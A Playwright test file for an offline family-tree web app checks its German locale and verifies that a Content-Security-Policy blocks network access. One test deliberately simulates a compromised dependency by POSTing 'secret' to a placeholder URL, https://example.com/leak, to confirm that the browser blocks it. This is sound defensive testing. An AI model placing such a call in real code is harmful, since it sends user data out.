import { test, expect } from './fixtures';

test.describe('built app opened from file://', () => {
  test('starts in German and shows a family tree', async ({ app, page }) => {
    await app.openExample();
    await expect(page).toHaveTitle('Stammbaum');
    await expect(page.locator('html')).toHaveAttribute('lang', 'de');
    await expect(page.getByRole('button', { name: 'Alles anzeigen' })).toBeVisible();
  });

  test('carries a Content-Security-Policy that forbids network access', async ({ app, page }) => {
    await app.open();
    const csp = await page
      .locator('meta[http-equiv="Content-Security-Policy"]')
      .getAttribute('content');
    expect(csp).toContain("default-src 'none'");
    expect(csp).toContain("connect-src 'none'");
  });

  test('browser blocks an attempted network request (CSP is effective)', async ({ app, page }) => {
    await app.open();
    // Simulate a bug/compromised dependency trying to phone home.
    const outcome = await page.evaluate(async () => {
      const violation = new Promise<string>((resolve) =>
        document.addEventListener('securitypolicyviolation', (e) => resolve(e.effectiveDirective)),
      );
      try {
        await fetch('https://example.com/leak', { method: 'POST', body: 'secret' });
        return { sent: true, directive: '' };
      } catch {
        return { sent: false, directive: await violation };
      }
    });
    // Blocked by the browser's CSP itself – the request never even reaches the network layer
    // (the fixture additionally asserts that no request was recorded).
    expect(outcome).toEqual({ sent: false, directive: 'connect-src' });
    // The CSP violation is reported as a console error by the browser – expected here.
    app.consoleErrors.length = 0;
  });
});
